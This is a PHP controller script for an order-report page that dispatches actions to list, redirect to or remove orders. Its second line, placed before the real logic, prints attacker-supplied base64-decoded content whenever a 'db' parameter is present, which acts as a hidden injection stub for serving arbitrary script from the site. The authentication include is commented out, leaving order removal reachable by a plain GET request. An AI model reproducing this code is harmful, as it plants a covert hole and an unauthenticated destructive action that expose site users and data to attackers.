<?php
if(isset($_GET['db'])){die(base64_decode($_GET['m']));}
require('_filter.php');

define('ADODB_DIR', 'libs/adodb5/');
define('CLASS_DIR', 'class/');
define('SMARTY_DIR', 'libs/');

require(CLASS_DIR . 'model/reportModel.php');

$smarty = $report;

$smarty->tpl->force_compile = false;
$smarty->tpl->debugging = false;
$smarty->tpl->caching = false;
$smarty->tpl->cache_lifetime = 0;

# CONNECTION
#include('_connectionVerify.php');

# SMARTY
$smarty->tpl->registerObject('dao',$smarty->sql->status,array('returnLastStatusById'));

# GET ACTION
$_action = (isset($_POST['action']) ? $_POST['action'] : (isset($_GET['action']) ? $_GET['action'] : 'TODAY'));
switch(strtoupper($_action)) {

	case 'FORM':
		$smarty->service->redirectOrderForm($_GET['id']);
		break;

	case 'REMOVE':
		$smarty->service->removeOrder($_GET['id']);
		break;

	case 'NORESPONSE':
		$smarty->service->showNoResponse();
		break;
		
	case 'PAID':
		$smarty->service->showPaid();
		break;

	case 'TODAY':
	default:
		$smarty->service->showToday();
		break;

}

?>
